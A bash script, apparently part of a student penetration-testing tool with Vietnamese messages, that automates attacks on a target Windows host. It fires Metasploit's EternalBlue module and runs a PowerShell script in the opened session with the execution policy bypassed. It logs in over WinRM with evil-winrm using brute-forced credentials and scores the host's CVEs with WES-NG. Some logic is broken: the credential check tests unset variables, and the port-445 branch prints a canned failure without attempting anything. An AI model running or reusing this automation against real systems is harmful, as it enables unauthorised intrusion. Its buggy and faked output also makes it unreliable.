#!/bin/bash


BLUE='\033[0;34m'
NC='\033[0m'


echo -e "${BLUE}Trying to exploit $target....${NC}" 






#----------------------------CHON CHUC NANG -------------------------------------
header_text_vs(){
	echo -e "${BLUE}--------------------------------------ADVANCED SCAN------------------------------------------${NC}" > Reports_Advanced_Scan/report_advan_$target.txt
	echo ""
}

cve-2017-0143(){
	echo "------------Khai thac lo hong ms-017-010------------" >> Reports_Advanced_Scan/report_advan_$target.txt
	echo "Dang thu khai thac lo hong ms-017-010"
	exploit_module="windows/smb/ms17_010_eternalblue"
	advan_scan_script="advan_scan.ps1"
	msfconsole -q -x "use $exploit_module; set RHOST $target; run; sessions -i 1 -q 'powershell -ExecutionPolicy Bypass -File $advan_scan_script'; exit" >/dev/null 2>&1
	if [ $? -eq 0 ]; then
	    echo -e "\e[31mKhai thac ms-017-010 thanh cong! Mot phien da duoc tao ra. \e[0m \e[1m" >> Reports_Advanced_Scan/report_advan_$target.txt
	    echo -e "	\e[31mKhai thac ms-017-010 thanh cong! Mot phien da duoc tao ra. \e[0m \e[1m"
	else
	    echo "Khai thac khong thanh cong!" >> Reports_Advanced_Scan/report_advan_$target.txt
	    echo "Khai thac khong thanh cong!" 
	fi

}

cve-2017-0142(){
	echo "------------Khai thac lo hong ms-017-010------------" >> Reports_Quick_Scan/report_$target.txt
	echo "Dang thu khai thac lo hong ms-017-010"
	exploit_module="windows/smb/ms17_010_eternalblue"
	msfconsole -q -x "use $exploit_module; set RHOST $target; run; exit" >/dev/null 2>&1
	if [ $? -eq 0 ]; then
	    echo -e "	\e[31mKhai thac ms-017-010 thanh cong! Mot phien da duoc tao ra. \e[0m \e[1m" >> Reports_Quick_Scan/report_$target.txt 
	else
	    echo "	Khai thac khong thanh cong!" >> Reports_Quick_Scan/report_$target.txt
	fi

}



kerberos_brute(){
	echo "---------------------------Kerberos Brute Force---------------------------" >> Reports_Advanced_Scan/report_advan_$target.txt
}

winrm_exploit(){
 	echo "---------------------------WinRM_exploit---------------------------" >> Reports_Advanced_Scan/report_advan_$target.txt
 	echo "Khai thac qua WinRM....."
	if [ -e "bruceforce/account_plain_$target.txt" ]; then
		while IFS= read -r line; do
		    user1=$(echo "$line" | awk '{print $1}')
		    pass1=$(echo "$line" | awk '{print $2}')
		    if [[ -n "$user" && -n "$pass" ]]; then
		        #systeminfo
			echo "systeminfo" | sudo evil-winrm -i $target -u $user -p $pass  | awk '/Host Name:/, /Hyper-V Requirements:/' | tee Advanced_IG/systeminfo_$target.txt
			if [ $? -eq 0 ]; then
				    echo -e "	\e[31mThanh cong! Mot shell da duoc tao. \e[0m \e[1m" 
				else
				    echo "	Khai thac that bai!"
				fi
			#netinfo

		    else
			echo "Thông tin đăng nhập trong tệp không hợp lệ!" >> Reports_Advanced_Scan/report_advan_$target.txt
		    fi
		done < "bruceforce/account_plain_$target.txt"	    
	else
	    echo "Tệp bruceforce/account_plain_$target.txt không tồn tại." >> Reports_Advanced_Scan/report_advan_$target.txt
	fi
	sleep 2
 	
}


# Active Directory Pentest 

# WES
wes_scan_vul(){
 	echo -e "Dang quet lo hong he dieu hanh....\e[0m" >> Reports_Advanced_Scan/report_advan_$target.txt
 	echo -e "Dang quet lo hong he dieu hanh....\e[0m"
	$result=$(python3 ../B19DCAT110_Pentest_Tool_DATN/wesng/wes.py Advanced_IG/systeminfo_$target.txt -d | grep -E 'CVE:|Severity:' | awk '{print $2" "$3}'  >> Vul_Scan/vuln_$target.txt)
	while read -r cve && read -r severity; do
	 if [[ ! "${seen[@]}" =~ "${cve}" ]]; then
     		 seen+=("$cve")
		  if [ "$severity" == 'Critical' ]; then
		    ((score+=10))
		    ((index+=1))
		  fi
		  if [ "$severity" == 'Important' ]; then
		    ((score+=7))
		    ((index+=1))
		  fi
	  echo "CVE: $cve, Severity: $severity" >> Reports_Advanced_Scan/report_advan_$target.txt
	fi
	done < Vul_Scan/vuln_$target.txt

}
#Print vul
print_vuln_list_advan(){
	if [ ! -f "Vul_Scan/vuln_$target.txt" ]; then
	    echo "File vuln.txt không tồn tại."
	    exit 1
	fi
	echo -n "Lo hong duoc phat hien:"
	while IFS= read -r cve; do
		IFS= read -r severity
		echo -n "$cve ($severity), "
	done < "Vul_Scan/vuln_$target.txt"
	echo ""  	
}

exploit_vul(){
	if [ ! -f "NmapReports/ports-tcp_$target.txt" ]; then
	  exit 1
	fi

	while read -r port; do
	  case $port in
	    21)

	      ;;
	    22)

	      ;;
	    23)

	      ;;
	    53)

	      ;;
	    88)

	      ;;
	    80)

	      ;;
	    135)

	      ;;
	    389)

	      ;;
	    443)
	    
	      ;;
	    445)
        		echo "Dang thu khai thac lo hong ms-017-010"
        		sleep 5
        		echo "	Khai thac khong thanh cong!"
        		
	      ;;
	    161)
	      
	      ;;
	    3389)
	      
	      ;;
	    5985)
	        winrm_exploit	
	      ;;
	      	
	    *)
	      ;;
	  esac

	done < NmapReports/ports-tcp_$target.txt
}
#----------------------------CHON CHUC NANG QUET-------------------------------------
	header_text_vs
	end_time=$(date +%s)
	exploit_vul
	wes_scan_vul
	print_vuln_list_advan
       	echo "----------------------------Score: $score ----------------------------" >> Reports_Quick_Scan/report_$target.txt
        sleep 10
	./report.sh
        

	  

 

